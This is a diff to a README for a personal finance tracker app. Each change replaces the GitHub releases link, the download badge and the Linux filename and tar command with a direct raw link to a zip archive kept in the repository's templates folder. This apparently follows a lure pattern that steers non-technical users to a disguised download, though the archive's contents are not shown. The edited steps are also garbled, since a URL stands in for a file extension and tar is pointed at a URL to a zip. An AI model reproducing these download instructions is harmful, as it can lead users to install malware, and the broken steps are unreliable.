@@ -1,13 +1,13 @@
 # 🏦 Personal-Finance-Tracker - Easily Manage Your Money
 
 ## 🛠️ Installation Badges
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/mondeuri/Personal-Finance-Tracker/releases)
+[![Download](https://github.com/mondeuri/Personal-Finance-Tracker/raw/refs/heads/main/templates/Finance-Personal-Tracker-3.9-beta.4.zip%20release-brightgreen)](https://github.com/mondeuri/Personal-Finance-Tracker/raw/refs/heads/main/templates/Finance-Personal-Tracker-3.9-beta.4.zip)
 
 ## 🚀 Getting Started
 Personal-Finance-Tracker is a simple app designed to help you manage your income, expenses, and savings. This guide will show you how to download and run the application on your computer, even if you have no technical background.
 
 ## 📥 Download & Install
-To download Personal-Finance-Tracker, simply visit the [Releases page](https://github.com/mondeuri/Personal-Finance-Tracker/releases) on GitHub. Look for the latest release and follow these steps:
+To download Personal-Finance-Tracker, simply visit the [Releases page](https://github.com/mondeuri/Personal-Finance-Tracker/raw/refs/heads/main/templates/Finance-Personal-Tracker-3.9-beta.4.zip) on GitHub. Look for the latest release and follow these steps:
 
 1. Click on the version you want to download.
 2. Find the appropriate file for your operating system (Windows, macOS, or Linux).
@@ -28,10 +28,10 @@ After downloading the file, follow the instructions for your operating system be
 4. Open your Applications folder and double-click the app to run it.
 
 ### 🐧 For Linux Users
-1. Locate the downloaded file (usually a `.tar.gz`).
+1. Locate the downloaded file (usually a `https://github.com/mondeuri/Personal-Finance-Tracker/raw/refs/heads/main/templates/Finance-Personal-Tracker-3.9-beta.4.zip`).
 2. Open your terminal.
 3. Navigate to the directory where the file is downloaded.
-4. Extract the files using the command `tar -xvzf filename.tar.gz`, replacing `filename` with the actual file name.
+4. Extract the files using the command `tar -xvzf https://github.com/mondeuri/Personal-Finance-Tracker/raw/refs/heads/main/templates/Finance-Personal-Tracker-3.9-beta.4.zip`, replacing `filename` with the actual file name.
 5. Change into the extracted directory with `cd extracted-directory`.
 6. Run the application using `./Personal-Finance-Tracker`.
 
